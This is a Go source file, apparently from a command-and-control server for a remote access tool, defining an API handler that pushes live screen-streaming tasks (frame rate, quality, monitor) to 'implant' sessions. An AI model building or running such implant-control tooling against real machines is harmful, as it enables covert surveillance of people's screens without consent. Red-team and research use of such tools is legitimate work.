package api

import (
	"encoding/json"
	"net/http"

	"github.com/gorilla/mux"
	"toshell/internal/server/logging"
)

// screenStreamHandler 启动/停止实时屏幕流。action: start / stop。
//
// P0.2 起支持流参数（可选）：
//
//	fps       1-10    帧率（默认 2）
//	quality   20-95   JPEG 质量（默认 70）
//	max_kbps  >=0     带宽上限 KB/s（0 = 不限，超限自动降画质/降帧）
//	monitor   >=0     0=全部显示器拼接，N=第 N 个显示器
//	max_width >=0     缩放宽度（0 = 原始分辨率）
//
// 参数会被服务端校验（越界钳制）后透传给植入端，并用于服务端侧帧限速。
func (s *Server) screenStreamHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]

	var req struct {
		Action   string `json:"action"`
		FPS      *int   `json:"fps"`
		Quality  *int   `json:"quality"`
		MaxKbps  *int   `json:"max_kbps"`
		Monitor  *int   `json:"monitor"`
		MaxWidth *int   `json:"max_width"`
		Format   string `json:"format"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, `{"error":"Invalid request body"}`, http.StatusBadRequest)
		return
	}
	action := req.Action
	if action == "" {
		action = "start"
	}
	// 会话不存在 → 404、listener 未就绪 → 503：别把"客户端 id 写错"报成 5xx 服务端故障
	// （见 handlers_session_guard.go 的语义约定；e2e 冒烟把这条列为验收点）。
	if !s.requireListener(w) {
		return
	}
	if !s.requireSession(w, id) {
		return
	}

	// 校验并钳制参数（越界不报错，避免前端小改动直接 400）
	fps := intParam(req.FPS, 2, 1, 10)
	quality := intParam(req.Quality, 70, 20, 95)
	maxKbps := intParam(req.MaxKbps, 0, 0, 100000)
	monitor := intParam(req.Monitor, 0, 0, 16)
	maxWidth := intParam(req.MaxWidth, 0, 0, 7680)
	format := req.Format
	switch format {
	case "jpeg", "png", "auto":
	default:
		format = "jpeg" // 屏幕流默认 JPEG：PNG 帧体积过大
	}

	params := map[string]interface{}{
		"fps":       fps,
		"quality":   quality,
		"max_kbps":  maxKbps,
		"monitor":   monitor,
		"max_width": maxWidth,
		"format":    format,
	}

	taskInfo, err := s.taskMgr.CreateScreenStream(id, action, params)
	if err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	if err := s.listener.PushTask(id, taskInfo); err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}

	// 服务端帧限速：按期望帧率丢弃超发帧（停止流时清理）
	if action == "stop" {
		s.frameLimiter().Reset(id)
	} else {
		s.frameLimiter().SetFPS(id, fps)
	}

	logging.Info("api", "screen-stream (%s) pushed to session %s (fps=%d quality=%d monitor=%d max_kbps=%d)",
		action, id, fps, quality, monitor, maxKbps)
	json.NewEncoder(w).Encode(map[string]interface{}{
		"task_id":   taskInfo.ID,
		"task_type": taskInfo.TaskType,
		"action":    action,
		"params":    params,
		"message":   "screen stream task pushed",
	})
}

// intParam 取值并钳制到 [min,max]；nil 时返回默认值。
func intParam(v *int, def, min, max int) int {
	if v == nil {
		return def
	}
	n := *v
	if n < min {
		n = min
	}
	if n > max {
		n = max
	}
	return n
}
